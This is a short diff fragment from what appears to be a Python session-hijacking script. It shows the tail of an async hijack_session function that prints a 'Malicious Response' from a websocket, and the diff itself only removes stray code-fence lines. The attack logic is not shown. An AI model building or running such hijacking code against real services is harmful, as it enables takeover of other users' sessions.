@@ -109,11 +109,6 @@ async def hijack_session(token, session_id):
             
             final_resp = await websocket.recv()
             print(f"[+] Malicious Response: {final_resp}")
-
-
-```
-
-```python
     except Exception as e:
         print(f"[-] Hijacking failed or blocked: {e}")
 
